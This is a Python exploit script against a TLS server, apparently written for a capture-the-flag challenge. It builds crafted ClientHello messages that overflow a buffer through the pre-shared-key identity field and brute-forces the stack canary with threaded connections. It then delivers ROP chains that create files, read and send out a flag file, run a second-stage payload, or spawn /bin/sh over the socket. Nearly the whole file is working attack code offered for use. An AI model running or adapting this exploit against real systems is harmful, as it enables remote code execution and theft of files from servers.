import socket, struct, os, sys, time, threading

MAGIC = b"1401518dc5d7641ccd41593a5d812410"

POP_RDI   = 0x4251BD
POP_RSI   = 0x5E9A79
POP_RDX   = 0x52F0D2
POP_RAX   = 0x5F6C9A
MOV_PTR   = 0x77FCC3      # mov qword ptr [rdi], rdx ; ret
SYSCALL   = 0x4020C2
SYSCALL_RET = 0x76E706   # syscall ; ret
LEAVE_RET = 0x402DB9
BSS       = 0x975000

# offsets inside the copied blob
OFF_CANARY = 0x58
OFF_RET    = 0x68


def ext(t, data):
    return struct.pack("!HH", t, len(data)) + data


def make_sni(n):
    tail = ".example.com"
    need = n - len(tail)
    assert need >= 1, n
    labels = []
    while need > 0:
        take = min(63, need)
        if need - take == 0:
            labels.append("a" * take); need = 0
        else:
            labels.append("a" * take); need -= take + 1
            if need < 0:
                labels[-1] = "a" * (take + need); need = 0
    return ".".join(labels) + tail


def build_ch(sni, identity=None, key_share=b"\x00" * 32, cookie=None):
    rand = os.urandom(32); sid = os.urandom(32)
    exts = b""
    name = sni.encode()
    sn = b"\x00" + struct.pack("!H", len(name)) + name
    exts += ext(0, struct.pack("!H", len(sn)) + sn)
    exts += ext(10, struct.pack("!H", 2) + struct.pack("!H", 0x001D))
    sigs = struct.pack("!H", 10) + b"".join(struct.pack("!H", x) for x in (0x0804, 0x0403, 0x0503, 0x0401, 0x0201))
    exts += ext(13, sigs)
    exts += ext(43, b"\x02\x03\x04")
    if cookie is not None:
        exts += ext(44, struct.pack("!H", len(cookie)) + cookie)
    if key_share is None:
        exts += ext(51, b"\x00\x00")
    else:
        entry = struct.pack("!H", 0x001D) + struct.pack("!H", len(key_share)) + key_share
        exts += ext(51, struct.pack("!H", len(entry)) + entry)
    if identity is not None:
        exts += ext(45, b"\x01\x01")
        ident = struct.pack("!H", len(identity)) + identity + struct.pack("!I", 0)
        binders = b"\x30" + b"\x00" * 48
        exts += ext(41, struct.pack("!H", len(ident)) + ident + struct.pack("!H", len(binders)) + binders)
    body = (b"\x03\x03" + rand + bytes([len(sid)]) + sid + b"\x00\x02\x13\x02" + b"\x01\x00" +
            struct.pack("!H", len(exts)) + exts)
    return b"\x01" + struct.pack("!I", len(body))[1:] + body


def send_hs(s, hs):
    s.sendall(b"\x16\x03\x01" + struct.pack("!H", len(hs)) + hs)


def read_all(s, t=0.8):
    s.settimeout(t)
    out = b""
    try:
        while True:
            b = s.recv(4096)
            if not b:
                break
            out += b
    except Exception:
        pass
    return out


def hrr_cookie(rec):
    if len(rec) < 12 or rec[0] != 0x16:
        return None
    p = 5
    ln = int.from_bytes(rec[p + 1:p + 4], "big")
    hs = rec[p + 4:p + 4 + ln]
    HRR = bytes.fromhex("cf21ad74e59a6111be1d8c021e65b891c2a211167abb8c5e079e09e2c8a8339c")
    if len(hs) < 35 or hs[2:34] != HRR:
        return False
    sid_len = hs[34]
    q = 35 + sid_len + 2 + 1
    if q + 2 > len(hs):
        return None
    elen = int.from_bytes(hs[q:q + 2], "big")
    exts = hs[q + 2:q + 2 + elen]
    i = 0
    cookie = None
    while i + 4 <= len(exts):
        et = int.from_bytes(exts[i:i + 2], "big")
        el = int.from_bytes(exts[i + 2:i + 4], "big")
        if et == 44:
            cookie = exts[i + 6:i + 4 + el]
        i += 4 + el
    return cookie


def fire(host, port, sni, identity, wait=0.6):
    try:
        s = socket.create_connection((host, port), timeout=5)
    except Exception:
        return b"CONNFAIL"
    try:
        send_hs(s, build_ch(sni, identity=None, key_share=None))
        rec = read_all(s, 0.8)
        ck = hrr_cookie(rec)
        if ck is False:
            s.close(); return b"NOHRR"
        send_hs(s, build_ch(sni, identity=identity, cookie=ck))
        r = read_all(s, wait)
        s.close()
        return r
    except Exception:
        try: s.close()
        except Exception: pass
        return b"EXC"


def make_blob(canary, tail=b""):
    b = bytearray(MAGIC + b"\x00")
    b += b"F" * (OFF_CANARY - len(b))
    assert len(b) == OFF_CANARY
    b += canary
    assert len(b) == 0x60
    b += tail
    return bytes(b)


def q(x):
    return struct.pack("<Q", x)


def chain_write(addr, data8):
    """returns gadget bytes: *addr = data8 (8 bytes)"""
    return q(POP_RDI) + q(addr) + q(POP_RDX) + q(data8) + q(MOV_PTR)


def build_shell_chain(dup_fd=None, path_addr=BSS+0x40, sh=b"/bin/sh\x00"):
    c = b""
    # write "/bin/sh\0" to path_addr
    v1 = int.from_bytes(sh[:8].ljust(8, b"\x00"), "little")
    c2 = chain_write(path_addr, v1)
    if dup_fd is not None:
        # dup2(dup_fd, 0) ; dup2(dup_fd, 1)
        for newfd in (0, 1):
            c2 += q(POP_RDI) + q(dup_fd) + q(POP_RSI) + q(newfd) + q(POP_RAX) + q(33) + q(SYSCALL)
    # execve(path, NULL, NULL)
    c2 += q(POP_RDI) + q(path_addr) + q(POP_RSI) + q(0) + q(POP_RDX) + q(0) + q(POP_RAX) + q(59) + q(SYSCALL)
    return c2


def build_mkdir_chain(path=b"/tmp/pwned_marker"):
    c = b""
    seg = [path[i:i + 8] for i in range(0, len(path) + 1, 8)]
    addr = BSS + 0x80
    for i, s in enumerate(seg):
        val = int.from_bytes(s.ljust(8, b"\x00"), "little")
        c += chain_write(addr + i * 8, val)
    c += q(POP_RDI) + q(addr) + q(POP_RSI) + q(0o777) + q(POP_RAX) + q(83) + q(SYSCALL)
    return c


def build_write_chain(msg, fd=1, addr=BSS + 0x100):
    c = b""
    seg = [msg[i:i + 8] for i in range(0, len(msg), 8)] or [b""]
    for i, sgm in enumerate(seg):
        c += chain_write(addr + i * 8, int.from_bytes(sgm.ljust(8, b"\x00"), "little"))
    c += q(POP_RDI) + q(fd) + q(POP_RSI) + q(addr) + q(POP_RDX) + q(len(msg)) + q(POP_RAX) + q(1) + q(SYSCALL)
    return c


def build_flag_chain(path=b"/flag", out_fds=(1, 0, 2, 4, 5, 3), buf=BSS + 0x200, open_fd=3):
    c = b""
    seg = [path[i:i + 8] for i in range(0, len(path) + 1, 8)]
    for i, sgm in enumerate(seg):
        c += chain_write(BSS + 0x40 + i * 8, int.from_bytes(sgm.ljust(8, b"\x00"), "little"))
    # open(path, O_RDONLY)
    c += q(POP_RDI) + q(BSS + 0x40) + q(POP_RSI) + q(0) + q(POP_RDX) + q(0) + q(POP_RAX) + q(2) + q(SYSCALL)
    # read(open_fd, buf, 0x200)
    c += q(POP_RDI) + q(open_fd) + q(POP_RSI) + q(buf) + q(POP_RDX) + q(0x200) + q(POP_RAX) + q(0) + q(SYSCALL)
    # write(fd, buf, 0x200) for each fd
    for fd in out_fds:
        c += q(POP_RDI) + q(fd) + q(POP_RSI) + q(buf) + q(POP_RDX) + q(0x200) + q(POP_RAX) + q(1) + q(SYSCALL)
    return c


def build_stage1(read_fd=4, n=0x400):
    return (q(POP_RDI) + q(read_fd) + q(POP_RSI) + q(BSS) + q(POP_RDX) + q(n) +
            q(POP_RAX) + q(0) + q(SYSCALL_RET) + q(LEAVE_RET))


def build_stage2(path=b"/tmp/fakeflag", sock_fd=4, open_fd=3, fds=(None, 1, 0, 5, 6)):
    path_addr = BSS + 0x700
    out_addr = BSS + 0x800
    c = b""
    seg = [path[i:i + 8] for i in range(0, len(path) + 1, 8)]
    for i, sgm in enumerate(seg):
        c += chain_write(path_addr + i * 8, int.from_bytes(sgm.ljust(8, b"\x00"), "little"))
    c += q(POP_RDI) + q(path_addr) + q(POP_RSI) + q(0) + q(POP_RDX) + q(0) + q(POP_RAX) + q(2) + q(SYSCALL_RET)
    c += q(POP_RDI) + q(open_fd) + q(POP_RSI) + q(out_addr) + q(POP_RDX) + q(0x200) + q(POP_RAX) + q(0) + q(SYSCALL_RET)
    for fd in fds:
        f = sock_fd if fd is None else fd
        c += q(POP_RDI) + q(f) + q(POP_RSI) + q(out_addr) + q(POP_RDX) + q(0x200) + q(POP_RAX) + q(1) + q(SYSCALL_RET)
    return c


def run_stage(host, port, canary, stage2, read_fd=4):
    blob = make_blob(canary, q(BSS) + build_stage1(read_fd=read_fd))
    sni = make_sni(len(blob))
    s = socket.create_connection((host, port), timeout=5)
    send_hs(s, build_ch(sni, identity=None, key_share=None))
    rec = read_all(s, 1.0)
    ck = hrr_cookie(rec)
    if ck is False:
        s.close(); return b"NOHRR"
    send_hs(s, build_ch(sni, identity=blob, cookie=ck))
    time.sleep(0.05)
    try:
        s.sendall(stage2)
    except Exception as e:
        pass
    r = read_all(s, 1.5)
    s.close()
    return r


def send_chain(host, port, canary, chain, wait=0.5):
    blob = make_blob(canary, q(0) + chain)   # saved rbp = 0
    sni = make_sni(len(blob))
    return fire(host, port, sni, blob, wait)


def brute_canary(host, port, threads=8, log=print):
    canary = bytearray(8)
    canary[0] = 0x00
    for k in range(2, 9):
        found = {}
        ev = threading.Event()

        def work(rng):
            for v in rng:
                if ev.is_set():
                    return
                c = bytearray(canary)
                c[k - 1] = v
                r = fire(host, port, make_sni(OFF_CANARY + k), make_blob(bytes(c)))
                if b"error" in r:
                    found['v'] = v
                    ev.set()
                    return

        ts = [threading.Thread(target=work, args=(range(i, 256, threads),)) for i in range(threads)]
        for t in ts: t.start()
        for t in ts: t.join()
        if 'v' not in found:
            log(f"[!] failed at byte {k-1}")
            return None
        canary[k - 1] = found['v']
        log(f"[+] byte{k-1}=0x{found['v']:02x}  canary={bytes(canary).hex()}")
    return bytes(canary)


if __name__ == "__main__":
    host = sys.argv[1]; port = int(sys.argv[2]); mode = sys.argv[3] if len(sys.argv) > 3 else "brute"
    if mode == "brute":
        t0 = time.time()
        c = brute_canary(host, port)
        print("canary:", c.hex() if c else None, "time", round(time.time() - t0, 1))
    elif mode == "mkdir":
        canary = bytes.fromhex(sys.argv[4])
        r = send_chain(host, port, canary, build_mkdir_chain())
        print("resp:", r[:64])
    elif mode == "write":
        canary = bytes.fromhex(sys.argv[4])
        msg = sys.argv[5].encode() if len(sys.argv) > 5 else b"PWNED\n"
        fd = int(sys.argv[6]) if len(sys.argv) > 6 else 1
        r = send_chain(host, port, canary, build_write_chain(msg, fd))
        print("resp:", r[:64])
    elif mode == "flag":
        canary = bytes.fromhex(sys.argv[4])
        path = sys.argv[5].encode() if len(sys.argv) > 5 else b"/flag"
        r = send_chain(host, port, canary, build_flag_chain(path=path), wait=1.5)
        print("resp:", r[:400])
    elif mode == "stage":
        canary = bytes.fromhex(sys.argv[4])
        path = (sys.argv[5].encode() if len(sys.argv) > 5 else b"/tmp/fakeflag")
        read_fd = int(sys.argv[6]) if len(sys.argv) > 6 else 4
        st2 = q(0) + build_stage2(path=path)
        r = run_stage(host, port, canary, st2, read_fd=read_fd)
        print("resp:", r[:300])
    elif mode == "shell":
        canary = bytes.fromhex(sys.argv[4])
        dup = int(sys.argv[5]) if len(sys.argv) > 5 else None
        r = send_chain(host, port, canary, build_shell_chain(dup_fd=dup), wait=1.0)
        print("resp:", r[:64])
